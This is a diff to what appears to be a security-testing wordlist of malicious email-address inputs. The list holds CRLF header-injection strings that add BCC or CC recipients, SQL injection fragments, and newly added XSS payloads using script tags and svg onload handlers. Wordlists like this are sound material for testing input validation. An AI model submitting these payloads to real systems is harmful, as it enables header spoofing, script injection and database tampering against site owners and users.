@@ -3,6 +3,10 @@ test@example.com\r\nBCC:attacker@example.com
 test@example.com%0aCC:attacker@example.com
 test@example.com\r\nContent-Type:text/html\r\n\r\n<b>Injected</b>
 
+"><script>alert(1)</script>@test.com
+"><svg/onload=alert(3)>@test.com
+"><svg/onload=confirm(1337)>"@x.y
+
 test' OR '1'='1@example.com
 test" OR "1"="1@example.com
 test@example.com'--
